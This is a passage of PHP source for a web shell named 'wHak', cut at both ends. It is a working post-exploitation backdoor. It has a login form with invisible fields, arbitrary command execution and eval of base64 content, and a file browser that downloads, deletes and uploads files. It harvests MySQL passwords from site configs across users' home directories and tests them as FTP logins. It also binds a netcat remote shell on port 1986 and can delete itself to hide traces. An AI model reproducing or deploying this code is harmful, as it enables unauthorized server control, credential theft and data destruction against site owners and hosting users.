iPjwvc3Bhbj4KICAgIDwvZGl2PgogICAgPGlmcmFtZSBpZD0iaWZyYW1lLWhhY2siIG5hbWU9ImlmcmFtZS1oYWNrIj48L2lmcmFtZT4KPC9ib2R5Pgo8L2h0bWw+',
);
    ####----

    function whak(){

        session_start();

        if(isset($_SESSION[$this->_cfg['session_index']]) === false){
            $_SESSION[$this->_cfg['session_index']] = array(
                'logged_in' => false,
                'whoami'    => trim(`whoami`),
                'uname'     => php_uname(),
                'notes'     => array(),
                'cwd'       => dirname(__FILE__),
                'server_name' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : trim(`hostname`),
                'php_path'=>str_replace('php is ', '', trim(`which php`)),
                'last_note' => false
            );
        }
        $this->Session = &$_SESSION[$this->_cfg['session_index']];
        $this->mysql = new mysql($this->Session['notes']);

        if(isset($_SERVER['REMOTE_ADDR']) === false){
            $this->cli = true;
            $this->Session['logged_in'] = true;
            $mode = 'shell';
        } else {

            if($this->logged_in() === false){
                if($_SERVER['REQUEST_METHOD'] === 'POST'){
                    if($this->log_in($_POST['user'], $_POST['pass'])){
                        $this->Session['logged_in'] = true;
                        header('Location: '. $_SERVER['PHP_SELF']);
                        exit;
                    }
                }
                ?>
                <form action="" method="post">
                    <input type="text" name="user" style="border: none; background: transparent;"/>
                    <input type="password" name="pass" style="border: none; background: transparent;" />
                    <input type="submit" value="" style="border: none; background: transparent;" />
                </form>
                <?php
                exit;
            }
            $mode = 'action_'.(isset($_GET['m']) ? $_GET['m'] : 'content');
        }

        $this->Aliases = array(
            'll'  => array(
                'type' => 'alias',
                'description' => 'A better ls',
                'cmd' => 'ls -lah',
            ),
            'fsh' => array(
                'type' => 'alias',
                'description' => 'Find users with shell access',
                'cmd' => 'cat /etc/passwd | grep -vE "nologin|noshell|false"',
            ),
            'fdbc' => array(
                'type' => 'function',
                'description' => 'Find db credientials',
                'cmd' => 'find_db_passwords'
            ),
            'fadbc' => array(
                'type' => 'function',
                'description' => 'Find all db credientials',
                'cmd' => 'find_all_db_passwords'
            ),
            'faf' => array(
                'type' => 'function',
                'description' => 'Find all valid ftp credientials from mysql connections',
                'cmd' => 'find_all_ftp'
            ),
            '?' => array(
                'type' => 'function',
                'description' => 'Displays this help message',
                'cmd' => 'help'
            ),
            'fsuid' => array(
                'type'=>'alias',
                'description' => 'find all suid files',
                'cmd' => 'find / -type f -perm -04000 -ls | grep -v "Permission Denied"'
            ),
            'fsuid -r' => array(
                'type'=>'alias',
                'description' => 'find all suid files recursive from current dir',
                'cmd' => 'find . -type f -perm -04000 -ls | grep -v "Permission Denied"'
            ),
            'fsgid' => array(
                'type'=>'alias',
                'description' => 'find all sgid files',
                'cmd' => 'find / -type f -perm -02000 -ls | grep -v "Permission Denied"'
            ),
            'fsgid -r' => array(
                'type'=>'alias',
                'description' => 'find all sgid files recursive from current dir',
                'cmd' => 'find . -type f -perm -02000 -ls | grep -v "Permission Denied"'
            ),
            'sop' => array(
                'type'=>'alias',
                'description' => 'Show open ports',
                'cmd' => 'netstat -an | grep -i listen'
            ),
            'brsh' => array(
                'type'=>'alias',
                'description' => 'Bind a remote shell: brsh [port]',
                'cmd' => "echo '#!{$this->Session['php_path']}\n<?php\nrequire \"". __FILE__ ."\";' > tmp_123 && chmod 755 tmp_123 && nc -e tmp_123 -l -p",
                'default_args' => array(1986)
            ),
            'frhd' => array(
                'type'=>'function',
                'description' => 'Find readable Home Directories',
                'cmd' => "find_readable_home_dir"
            )
        );




        #---- DO NOT REMOVE: START
/*        if ($handle = opendir(WH_CONTENT_DIR)) {
            while (false !== ($file = readdir($handle))) {
                if($file != '.' && $file != '..' && is_file(WH_CONTENT_DIR.$file)){
                    $this->Content[$file] = base64_encode(file_get_contents(WH_CONTENT_DIR.$file));
                }
            }
            closedir($handle);
        }
        #---- DO NOT REMOVE: END
*/
        if(method_exists($this, $mode)){
            $this->$mode();
        } else {
            die('not found');
        }
    }

    function logged_in(){
        return $this->Session['logged_in'];
    }

    function log_in($user, $password){
        return ($user === WH_USER && strcmp(sha1($password), WH_PASS) === 0);
    }

    function get_prompt(){
        return $this->Session['whoami'].'@'. $this->Session['server_name'] .':'.$this->Session['cwd'] .'$';
    }

    function shell(){
        $this->shell_listen();
    }
    function shell_output($text){
        fwrite(STDOUT, $text);
    }

    function shell_listen(){
        $this->shell_output($this->get_prompt().' ');
        $cmd = fgets(STDIN);
        $this->action_cmd(trim($cmd));
        $this->shell_listen();
    }

    function exec_cmd($cmd){
        $handle = popen($cmd.' 2>&1', 'r');
        $line = '';
        while(!feof($handle)){
            $line .= fread($handle, 2096);
        }
        pclose($handle);
        return $line;
    }

    /**
     * php 4 doesn't support file_put_contents
     */
    function file_put_contents($file, $contents, $append=false){
        $mode = ($append) ? 'a' : 'w';
        $file_handle = fopen($file, $mode);
        fwrite($file_handle, $contents);
        fclose($file_handle);
    }

    function get_note_html(){
        $html = '';
        foreach($this->Session['notes'] as $k =>$v){
            $time = date('g:ia', $v['time']);
            $note = htmlentities($v['note'], ENT_QUOTES);
            $html .= <<<EOF
            <div class="note">
                <span class="options">
                    <a href="?m=remove_note&amp;i={$k}" class="ajax icon note_delete" update="server-notes">X</a>
                    <span class="clear"></span>
                </span>
                <span class="contents">$note</span>
            </div>
EOF;

        }
        return $html;
    }

    function add_note($note, $type='note'){
        $time = time();
        array_push($this->Session['notes'], array( 'type' => $type, 'time' => $time, 'note' => $note));
        $this->Session['last_note'] = $time;
    }

    function remove_note($index){
        unset($this->Session['notes'][$index]);

        $notes = $this->Session['notes'];

        $this->Session['notes'] = array();
        foreach($notes as $v){
            $this->Session['notes'][] = $v;
        }
    }

    function find_var($var){
        $ret = false;
        $in_line = array("'",'"');
        $var = str_replace('$', '', $var);
        $var = preg_replace('/([\'\"\[\]])/', '\\\${1}', ($var));
        $tmp_regex = "{$var}[\s]*\=(.+);";

        $cmd="grep -hrPo \"{$tmp_regex}\" ".getcwd() ." | grep -v .svn";
        $res = $this->exec_cmd($cmd);
        $tm = array();
        preg_match_all("/$tmp_regex/", $res, $tm);
        if(isset($tm[1])){
            foreach($tm[1] as $v){
                $v = trim($v);
                $fc = substr($v, 0, 1);
                $lc = substr($v, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    $ret = substr($v, 1, -1);
                } else if(preg_match("/\$/", $v)){
                    // variable
                    $ret = $this->find_var($v);
                } else {
                    //define
                    $ret = $this->find_define($v);
                }
                if($ret !== false){
                    break;
                }
            }
        }
        return $ret;
    }

    function find_define($var){
        $ret = false;$in_line = array("'",'"');
        $matches = array();


        $tmp_regex = 'define\([\\\'\"]?'. $var .'[\\\'|\"]?\s*\,\s*([\\\'\"].+[\\\'\"])\);';
        $cmd="grep -hrPo \"{$tmp_regex}\" ".getcwd() ." | grep -v .svn";
        $res = $this->exec_cmd($cmd);
        $tm = array();
        preg_match_all("/$tmp_regex/", $res, $tm);
        if(isset($tm[1])){
            foreach($tm[1] as $v){
                $v = trim($v);
                $fc = substr($v, 0, 1);
                $lc = substr($v, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    $ret = substr($v, 1, -1);
                } else if(preg_match("/\$/", $v)){
                    // variable
                    $ret = $this->find_var($v);
                } else {
                    //define
                    $ret = $this->find_define($v);
                }
                if($ret !== false){
                    break;
                }
            }
        }

        return $ret;
    }

    /**
     * currently only mysql
     */
    function find_db_passwords ($dir = ""){
        set_time_limit(0);
        $order = array('host', 'user', 'pass');
        $in_line = array("'",'"');
        $ignore = array(
            'false'
        );
        $vars_found = array();
        if(empty($dir)){
        	chdir($this->Session['cwd']);
        }else{
        	chdir($dir);
        }

        $res = $this->exec_cmd("grep -rE mysqli?_p?connect ".getcwd() ." | grep -v .svn");
        $matches = array();
        preg_match_all("/mysqli?_p?connect\((.+?),\s?(.+?),\s?(.+?)[,|\)]/",$res, $matches);
        $Info = array (
            'host' => $matches[1],
            'user' => $matches[2],
            'pass' => $matches[3],
        );
        $Found = array();
        $tFound = array();
        $regex = '';

        foreach($Info['host'] as $k => $v){
            $tmpData = array(
                'host'  => $v,
                'user'  => $Info['user'][$k],
                'pass'  => $Info['pass'][$k]
            );
            $tFound[] = $tmpData;
        }

        foreach($tFound as $k => $data){

            foreach($data as $kt => $us){
                $us = trim($us);
                $fc = substr($us, 0, 1);
                $lc = substr($us, -1, 1);
                if(in_array($fc, $in_line) && in_array($lc, $in_line)){
                    // inline
                    $us = substr($us, 1, -1);

                } else if(preg_match('/\$/', $us)){
                    // variable
                    $us = $this->find_var($us);
                } else {
                    //define
                    $us = $this->find_define($us);
                }
                $data[$kt] = $us;
            }

            if($data['host'] !== false &&
               $data['user'] !== false &&
               $data['pass'] !== false){
                $Found[] = $data;
            }
        }

        $Found = array_unique($Found);
        var_dump($Found);
        foreach($Found as $data){
          $this->add_note(serialize($data), 'mysql_dbc');
        }

    }

    function find_all_db_passwords(){
		$passwd = file('/etc/passwd');

        foreach($passwd as $key => $val){
            if(strpos($val,"/home")){
                $str = explode(":",$val);
                if(is_readable($str['5']."/public_html/")){
                    $valid[] = $str['5']."/public_html/";
                }
            }
        }

        foreach($valid as $key => $val){
            $results[] = $this->find_db_passwords($val);
        }

        chdir($this->Session['cwd']);

    }

    function find_readable_home_dir(){
    	$passwd = file('/etc/passwd');

        foreach($passwd as $key => $val){
            if(strpos($val,"/home")){
                $str = explode(":",$val);
                if(is_readable($str['5']."/public_html/")){
                    $valid[] = $str['5']."/public_html/";
                }
            }
        }

        $output .= "################################# \n";
        foreach($valid as $key => $val){
            $output .= "## {$val}\n";;
        }
        $output .= "################################# \n";

        print $output;
    }

    function find_all_ftp(){

        $host = "127.0.0.1";

        foreach($this->Session['notes'] as $k =>$v){
            if($v['type'] === "mysql_dbc"){
                $info = unserialize($v['note']);
                $user = explode("_",$info['user']);
                $info['user'] = $user['0'];

                @$conn = ftp_connect($host);
                if($conn){
                    $ftp = ftp_login($conn,$info['user'],$info['pass']);
                    if($ftp){
                        $success[] = $info;
                    }

                    @ftp_quit($ftp);
                }
            }
        }

        $total = count($success);
        $count = 0;
        echo "################################ <br>";
        if($total > 0){
          foreach($success as $info){
            $count++;
            echo "## <br>";
            echo "## Username: {$info['user']}<br>";
            echo "## Password: {$info['pass']}<br>";
            if($count !== $total){
              echo "## _______________________________<br>";
            }

          }
        }else{
          echo "##  No FTP Accounts found <br>";
        }
        echo "################################ <br>";
    }

    /**
     * thank you webmaster at askapache dot com
     */
    function stat($file) {

        clearstatcache();
        $ss=@stat($file);
        if(!$ss) return false; //Couldnt stat file

        $ts=array(
            0140000=>'ssocket',
            0120000=>'llink',
            0100000=>'-file',
            0060000=>'bblock',
            0040000=>'ddir',
            0020000=>'cchar',
            0010000=>'pfifo'
        );

        $p=$ss['mode'];
        $t=decoct($ss['mode'] & 0170000); // File Encoding Bit

        $str =(array_key_exists(octdec($t),$ts))?$ts[octdec($t)]{0}:'u';
        $str.=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-');
        $str.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
        $str.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-');
        $str.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
        $str.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-');
        $str.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));

        $s=array(
            'perms'=>array(
                'umask'=>sprintf("%04o",@umask()),
                'human'=>$str,
                'octal1'=>sprintf("%o", ($ss['mode'] & 000777)),
                'octal2'=>sprintf("0%o", 0777 & $p),
                'decimal'=>sprintf("%04o", $p),
                'fileperms'=>@fileperms($file),
                'mode1'=>$p,
                'mode2'=>$ss['mode']),

            'owner'=>array(
                'fileowner'=>$ss['uid'],
                'filegroup'=>$ss['gid'],
                'owner'=> (function_exists('posix_getpwuid'))?
                    @posix_getpwuid($ss['uid']):'',
                'group'=> (function_exists('posix_getgrgid'))?
                    @posix_getgrgid($ss['gid']):''
            ),

            'file'=>array(
                'filename'=>$file,
                'realpath'=>(@realpath($file) != $file) ? @realpath($file) : '',
                'dirname'=>@dirname($file),
                'basename'=>@basename($fil/e)
            ),

            'filetype'=>array(
                'type'=>substr($ts[octdec($t)],1),
                'type_octal'=>sprintf("%07o", octdec($t)),
                'is_file'=>@is_file($file),
                'is_dir'=>@is_dir($file),
                'is_link'=>@is_link($file),
                'is_readable'=> @is_readable($file),
                'is_writable'=> @is_writable($file)
            ),

            'device'=>array(
                'device'=>$ss['dev'], //Device
                'device_number'=>$ss['rdev'], //Device number, if device.
                'inode'=>$ss['ino'], //File serial number
                'link_count'=>$ss['nlink'], //link count
               // 'link_to'=>($s['type']=='link') ? @readlink($file) : ''
            ),

            'size'=>array(
                'size'=>$ss['size'], //Size of file, in bytes.
                'blocks'=>$ss['blocks'], //Number 512-byte blocks allocated
                'block_size'=> $ss['blksize'] //Optimal block size for I/O.
            ),

            'time'=>array(
                'mtime'=>$ss['mtime'], //Time of last modification
                'atime'=>$ss['atime'], //Time of last access.
                'ctime'=>$ss['ctime'], //Time of last status change
                'accessed'=>@date('Y M D H:i:s',$ss['atime']),
                'modified'=>@date('Y M D H:i:s',$ss['mtime']),
                'created'=>@date('Y M D H:i:s',$ss['ctime'])
            ),
        );

        clearstatcache();
        return $s;
    }

    function bytes_to_human($bytes) {
        $size = $bytes / 1024;
        if($size < 1024) {
            $size = number_format($size, 2);
            $size .= ' KB';
        } else {
            if($size / 1024 < 1024) {
                $size = number_format($size / 1024, 2);
                $size .= ' MB';
            } else if ($size / 1024 / 1024 < 1024) {
                $size = number_format($size / 1024 / 1024, 2);
                $size .= ' GB';
            }
        }
        return $size;
    }

    function ls($dir){
        $dir = (substr($dir, -1) === '/') ? $dir : $dir .'/';
        if ($dir_handle = opendir($dir)) {
            $files = array();
            while (false !== ($file = readdir($dir_handle))) {
                $stat = $this->stat($dir . $file);
                if($stat){
                    $files[$file] = array(
                        'type'  => $stat['filetype']['type'],
                        'perms' => $stat['perms']['human'],
                        'readable' => $stat['filetype']['is_readable'],
                        'writable' => $stat['filetype']['is_writable'],
                        'owner_id' => $stat['owner']['fileowner'],
                        'group_id' => $stat['owner']['filegroup'],
                        'owner_name' => $stat['owner']['owner']['name'],
                        'group_name' => $stat['owner']['group']['name'],
                        'size_human' => $this->bytes_to_human($stat['size']['size']),
                        'accessed'=>$stat['time']['accessed'],
                        'modified'=>$stat['time']['modified'],
                        'created'=>$stat['time']['created'],
                        'realpath' => $stat['file']['dirname'] .'/'.$stat['file']['basename']
                    );
                } else {
                    $files[$file] = array();
                }
            }
            closedir($dir_handle);
            ksort($files);
            return $files;
        }
        return false;
    }

    function help(){
        ksort($this->Aliases);
        $out = "
    ################################
    ## wHak ". WH_VERSION ."
    ##\n";
        foreach($this->Aliases as $cmd => $v){
            $out .= "    ##    ". str_pad($cmd, 15, ' ')." {$v['description']}\n";
        }

        $out .= "    ##
    ################################\n";
        return $out;
    }

    #########################
    ## Actions Below Here
    #########################


    function action_content(){
        $object = isset($_GET['o']) ? $_GET['o'] : 'main.html';
        if(isset($this->Content[$object])){
            $ext = preg_replace('/^.*?([a-zA-Z0-9]*)$/', '$1', $object);
            switch($ext){
                case 'css':
                    header('Content-type: text/css');
                    print base64_decode($this->Content[$object]);
                    break;
                case 'js':
                    header('Content-type: text/javascript');
                    print base64_decode($this->Content[$object]);
                    break;
                default:
                    eval(base64_decode($this->Content[$object]));
                    break;
            }
        }
    }

    function action_info() {
        $safe_mode = in_array(ini_get('safe_mode'), array(1, 'on'));
        $info = array(
            'name' => $this->Session['uname'],
            'whoami' => $this->Session['whoami'],
            'prompt' => $this->get_prompt(),
            'time' =>date('Y-m-d H:i:s'),
            'uptime' => trim(`uptime`),
            'last_note' => $this->Session['last_note'],
            'php_version' => "<span title='".PHP_VERSION." Safe mode is ". ($safe_mode ? 'ON':'OFF') ."' style='color:#". ($safe_mode ? '0f0':'f99') ."'>".PHP_VERSION."</span>",
        );

        header('Content-type: text/xml');
        print '<?xml version="1.0" encoding="UTF-8"?>';
        print "<status>";

        print '<server ';
        foreach($info as $k => $v){
            print "$k=\"". htmlentities($v) ."\" ";
        }
        print ' />';
        print "</status>";
    }

    function action_file_browser_cd(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            chdir($_GET['path']);
            $this->Session['cwd'] = getcwd();
            $this->action_ls();
        }
    }

    function action_file_browser_view(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $ext = preg_replace('/^.*?([a-zA-Z0-9]*)$/', '$1', $_GET['path']);
            switch($ext){
                case 'php':
                    highlight_file($_GET['path']);
                    break;
                default:
                    echo htmlentities(file_get_contents($_GET['path']), ENT_QUOTES);
                    break;
            }
        }
    }

    function action_file_browser_dl(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $filename = basename($_GET['path']);
            if(is_dir($_GET['path'])){
                $tmp_dir = sys_get_temp_dir();
                $filename = $tmp_dir .'/'. $filename .'.tgz';
                $this->exec_cmd('tar -czvf "'.$filename.'" "'. $_GET['path'] .'"');
                header('Content-type: application/x-gzip');
                header('Content-Disposition: attachment; filename="'. $filename .'.tgz"');
                readfile('/tmp/'. $filename .'.tgz');
            } else {
                //header('Content-type: application/x-gzip');
                header('Content-Disposition: attachment; filename="'. $filename .'"');
                readfile($_GET['path']);
            }
            exit;
        }
    }

    function action_file_browser_rm(){
        if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            $r = $this->exec_cmd('rm -rf "'. $_GET['path'] .'"');
            $this->action_ls();
        }
    }

    function action_file_browser_upload(){
        chdir($this->Session['cwd']);
        $target_path = basename($_FILES['uploadedfile']['name']);
        move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
    }

    function action_ls(){

        $file_list = $this->ls($this->Session['cwd']);
        print "<form id='file-upload' target='iframe-hack' action='?m=file_browser_upload' method='post' enctype='multipart/form-data'>
                <input name='uploadedfile' type='file' /><input type='submit' value='Upload File' /></form>";

        print "<h2>".htmlentities($this->Session['cwd'], ENT_QUOTES)."</h2>";
        print "<div id='file-contents'></div>";
        print "<table class='file-list'>";

        $keys = array(
            'perms',
            'owner_id',
            'group_id',
            'owner_name',
            'group_name',
            'size_human',
            'accessed',
            'modified',
            'created'
        );

        foreach($file_list as $filename => $data){
            print '<tr>';
            switch($data['type']){
                case 'dir':
            print '<td class="options">
            <a class="icon file_folder_down" href="?m=file_browser_dl&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon file_folder_delete" update="file-section" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <!--a class="icon file_edit" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a-->
            </td>';
                    print '<td><a update="file-section" class="ajax" href="?m=file_browser_cd&path='. base64_encode($data['realpath'] . $filename) .'">'. htmlentities($filename, ENT_QUOTES) .'</a></td>';
                    break;
                case 'file':
            print '<td class="options">
            <a class="icon file_down" href="?m=file_browser_dl&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon file_delete" update="file-section" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <a class="ajax icon note_add" href="?m=add_note&path='. base64_encode($data['realpath'] . $filename) .'"></a>
            <!--a class="icon file_edit" href="?m=file_browser_rm&path='. base64_encode($data['realpath'] . $filename) .'"></a-->
            </td>';
                    print '<td><a update="file-contents" class="ajax" href="?m=file_browser_view&path='. base64_encode($data['realpath'] . $filename) .'">'. htmlentities($filename, ENT_QUOTES) .'</a></td>';
                    break;
            }

//            var_dump($data);
            foreach($keys as $k){ //$data as $d){
                print '<td>'.htmlentities($data[$k], ENT_QUOTES).'</td>';
            }
            print '</tr>';
        }
        print '</table>';
    }

    function action_cmd($cmd=false){
        $cmd = $cmd ? trim($cmd) : trim(stripslashes($_POST['cmd']));
        if(empty($cmd)){
            return;
        }

        $capture_output = preg_match("/^:/", $cmd);
        if($capture_output){
            $cmd = preg_replace("/^:/", '', $cmd);
        }


        $Alias = array(
            'type'=>'cmd',
            'cmd' => $cmd
        );

        if(strpos($cmd, ' ') !== false){
            $cmd_ar = explode(' ', $cmd);
        }

        if(key_exists($cmd, $this->Aliases)){
            $Alias = $this->Aliases[$cmd];
        } else if(isset($cmd_ar) && key_exists($cmd_ar[0], $this->Aliases)){
            $Alias = $this->Aliases[$cmd_ar[0]];
        }

        chdir($this->Session['cwd']);
        if($this->cli === false){
            echo $this->get_prompt().' '. htmlentities($cmd) . "\n";
        }
        switch($Alias['type']){
            case 'function':
                $response = (method_exists($this, $Alias['cmd'])) ? call_user_method($Alias['cmd'], $this) : '';
                break;
            default:
                if($Alias['cmd'] != $cmd && (isset($cmd_ar) || isset($Alias['default_args']))){

                    $arg_ar = array();
                    if(isset($Alias['default_args'])){
                        $arg_ar = array_merge($arg_ar, $Alias['default_args']);
                    }

                    if(isset($cmd_ar)){
                        array_shift($cmd_ar);
                        $arg_ar = array_merge($arg_ar, $cmd_ar);
                    }
                    $args = implode(' ', $arg_ar);
                    $Alias['cmd'] .= " $args";
                }

                $response = $this->exec_cmd($Alias['cmd']);
                break;
        }

        if($capture_output){
            $this->add_note("CAPTURED--\n{$response}");
        }
        print htmlentities($response);

        $mat=array();
        if(preg_match_all("/^cd (.*)/", $cmd, $mat)){
            chdir($mat[1][0]);
            $this->Session['cwd'] = getcwd();
        }
    }

    function action_get_notes(){
        print $this->get_note_html();
    }

    function action_add_note(){
        if(isset($_POST['notes'])){
            $this->add_note($_POST['notes']);
            print $this->get_note_html();
        } else if(isset($_GET['path'])){
            $_GET['path'] = base64_decode($_GET['path']);
            if(is_file($_GET['path'])){
                $this->add_note(serialize(array('file_name' => basename($_GET['path']), 'contents' => file_get_contents($_GET['path']))), 'file');
            }
        }
    }

    function action_remove_note(){
        $this->remove_note($_GET['i']);
        print $this->get_note_html();
    }


    function action_clean_up (){
        if(is_dir(WH_CONTENT_DIR)){
            $rm = "rm -rf ".WH_CONTENT_DIR;
            `{$rm}`;
        }
        unlink(__FILE__);
        die('House keeping');
    }

    function action_dl(){
        if(WH_STATUS === 'EXTRACTED'){
            $_GET['dl']=true;
            $this->action_compile();
        } else {
            header('Content-Disposition: attachment; filename="whak.'. strtolower(str_replace(' ', '', WH_VERSION)) .'.php"');
            readfile(__FILE__);
            exit;

        }
    }

    function action_dl_notes($content = "", $file = false){
        if((empty($content))&&(!$file)){
            $types = array();
            foreach($this->Session['notes'] as $k => $v){
                if(isset($types[$v['type']]) === false){
                    $types[$v['type']] =array();
                }
                $types[$v['type']][] = $k;
            }
            $tmp_dir      = sys_get_temp_dir();
            $old_cwd      = $this->Session['cwd'];
            $notes_folder = 'whak_notes('. $this->Session['server_name'] .')';
            $notes_path   = $tmp_dir .'/'.$notes_folder .'/';
            mkdir($notes_path);
            chdir($notes_path);
            $this->Session['cwd'] = $tmp_dir;

            foreach($types as $type => $keys){
                switch($type){
                    case 'note':
                    case 'mysql_dbc':
                        foreach($keys as $k){
                            $tmp = $this->Session['notes'][$k];
                            $this->file_put_contents($notes_path.$type, date('Y-m-d H:i:s', $tmp['time']) ."\n{$tmp['note']}\n\n", true);
                        }
                        break;
                    case 'file':
                        foreach($keys as $k){
                            $tmp = unserialize($this->Session['notes'][$k]['note']);
                            $tmp_file = $notes_path.$tmp['file_name'];
                            $i=1;
                            while(file_exists($tmp_file)){
                                $tmp_file = $notes_path.$tmp['file_name']."{$i}";
                                ++$i;
                            }
                            $this->file_put_contents($tmp_file, $tmp['contents']);
                        }
                        break;
                }
            }
            chdir($tmp_dir);
            $notes_tar = $notes_folder.'.tgz';
            $this->exec_cmd('tar -czvf "'.$notes_tar .'" "'.$notes_folder.'"');

            header('Content-type: application/x-gzip');
            header('Content-Disposition: attachment; filename="'. $notes_tar .'"');
            readfile($notes_tar);

            $this->exec_cmd('rm -rf "'. $notes_tar .'"');
            $this->exec_cmd('rm -rf "'. $tmp_dir .'"');
            $this->Session['cwd'] = $old_cwd;

/*
            foreach($this->Session['notes'] as $k =>$v){

                $time = date('m/d/Y g:ia', $v['time']);
                $note = htmlentities($v['note'], ENT_QUOTES);
                $content .= $time . " \r\n";
                $content .= $note . " \r\n";
            }
        }
        if($file){
            header('Content-Disposition: attachment; filename="whak_'. basename($content));
            readfile($content);
            exit;
        } else {
            if(!empty($content)){
                header('Content-Disposition: attachment; filename="whak_n_'. $this->Session['whoami'].'@'. $_SERVER['HTTP_HOST'] .'.txt');
                print $content;
                exit;
            } else {
                die("you cant do that");
            }*/
        }

    }

    function action_change_pass(){
        if(isset($_POST['pass'])){

        }
    }

    function action_logout(){
        session_destroy();
        die('thanks for playing');
    }

    function action_compile(){
        $file = file_get_contents(__FILE__);
        if(WH_STATUS === 'EXTRACTED'){
            $file = preg_replace("/'WH_STATUS',      'EXTRACTED'/", "'WH_STATUS',      'COMPILED'", $file, 1);

            ob_start();
            print '    var $Content = ';
            var_export($this->Content);
            print ';';
            $c = ob_get_contents();
            ob_end_clean();

            $find = array(
                "/#-{4} DO NOT REMOVE: START\n/",
                "/#-{4} DO NOT REMOVE: END\n/",
                '/\s{4}#{4}-{4}\n\s{4}var \$Content = array\(\);\n\s{4}#{4}-{4}/'
            );

            $replace = array(
                "#---- DO NOT REMOVE: START\n/*",
                "#---- DO NOT REMOVE: END\n*/",
                "    ####----\n{$c}\n    ####----"
            );

            $file = preg_replace($find, $replace, $file);
            if(isset($_GET['dl'])){
                header('Content-Disposition: attachment; filename="whak.'. strtolower(str_replace(' ', '', WH_VERSION)) .'.php"');
                print $file;
                exit;
            }

            whak::file_put_contents(__FILE__, $file);
            header('Location: '. $_SERVER['PHP_SELF']);
            exit;
        } else {
            die('you cant do that');
        }
    }

    function action_extract(){
        $file = file_get_contents(__FILE__);
        if(WH_STATUS === 'COMPILED'){
            $file = preg_replace("/'WH_STATUS',      'COMPILED'/", "'WH_STATUS',      'EXTRACTED'", $file, 1);
            if(!is_dir(WH_CONTENT_DIR)){
                if(!mkdir(WH_CONTENT_DIR)){
                    die("Can't Extract");
                }
            }

            foreach($this->Content as $file_name => $contents){
                file_put_contents(WH_CONTENT_DIR.$file_name, base64_decode($contents));
            }

            $find = array(
                "/#-{4} DO NOT REMOVE: START\n\/\*/",
                "/#-{4} DO NOT REMOVE: END\n\*\//",
                "/\s{4}#{4}-{4}\n[.\s\S]*?\s{4}#{4}-{4}/"
            );

            $replace = array(
                "#---- DO NOT REMOVE: START\n",
                "#---- DO NOT REMOVE: END\n",
                "    ####----\n    var \$Content = array();\n    ####----"
            );

            $file = preg_replace($find, $replace, $file);
            whak::file_put_contents(__FILE__, $file);
            header('Location: '. $_SERVER['PHP_SELF']);
            exit;
        } else {
            die('you cant do that');
        }
    }

    function action_mysql($get = ""){
	if($get == "") {
	  $get = $_GET;
	}
		$this->mysql->notes = $this->Session['notes'];
    	print $this->mysql->viewDisplay($get);
    }
}


/**
 *
 * MYSQL TO DO
 *
 * Fix POST Updates / Deletes
 * Add way to add custom mysql connections through notes manager
 * Fix SQL Query box
 * Fix mysql not seeing connections at first load
 *
 */
class mysql {
    var $dbhost;
    var $dbinfo;
    var $dbpass;
    var $dbname;
    var $conn;
    var $db;
    var $query;
    var $results;
    var $tquery = 0; # not needed and has a bug
    var $queries;
    var $tbl = array();
    var $limit = " LIMIT 30";
    var $file;
    var $current;
    var $noWorkie;

    // Connection and primary DB queries
    function mysql($notes = array()){
        $this->dbhost = "localhost";
        $this->notes = $notes;
        $this->file = basename($_SERVER['SCRIPT_FILENAME']);
        $this->current = (isset($_GET['current']) ? $_GET['current'] : 0);
        $this->dbinfo = array();

        if(count($this->notes) > 0){
        	$this->load();
        	if(count($this->dbinfo) > 0){
            	$this->conn = mysql_connect($this->dbhost, $this->dbinfo[$this->current]['user'], $this->dbinfo[$this->current]['pass']);

				if($_GET['db']){
				    $this->dbname = base64_decode($_GET['db']);
				    $this->db = mysql_select_db($this->dbname,$this->conn);
				}
		    }
        }
    }

    function load(){
        $count = 0;

        foreach($this->notes as $k =>$v){
            if($v['type'] === "mysql_dbc"){
                $info = unserialize($v['note']);
                if($info['user'] !== "" && $info['pass'] !== ""){
                     $testCon = @mysql_connect($this->dbhost, $info['user'], $info['pass']);
                     if($testCon){
                         $this->dbinfo[$count]['user'] = $info['user'];
                         $this->dbinfo[$count]['pass'] = $info['pass'];

                         $count++;
                     }
                }
            }
        }
    }

    function query($query, $results = 1){
        $this->queries[(count($this->queries) + 1)]["query"] = $query;
        if($results){
            $this->query = $query;
            $this->results = @mysql_query($query, $this->conn);
        }else{
            $query = ($query ? $query : $this->query);
            mysql_query($query, $this->conn);
        }

        if(mysql_error()){
            return $this->error($query, mysql_error());
        }else{
            if($this->tquery){
                $this->describe($query);
            }
            return $this->results;
        }
    }

    function numRows($query = ""){
        return mysql_num_rows($this->query($query,"0"));
    }

    function describe($query){
        if(!preg_match("/^show/",strtolower($query))){
            $count = (count($this->queries) + 1);
            if(substr($query, 0, 9) !== "DESCRIBE "){
                $this->queries[$count]["describe"] = "DESCRIBE ". $query;
            }
        }
    }

    function fetch($query){
        return mysql_fetch_assoc($this->query($query));
    }

    function getArray($query){

        $this->query($query);
        while($row = mysql_fetch_assoc($this->results)){
            $results[] = $row;
        }

        foreach($results as $k => $v){
            $arr[] = $v;
        }

        return $this->getReturn($arr);

    }

    function getReturn($item){
        if(is_array($item)){
            $arr = array();
            foreach($item as $k => $v){
	            $arr[$k] = $this->getReturn($v);
            }
            return $arr;
        }else{
            return htmlentities(stripslashes($item));
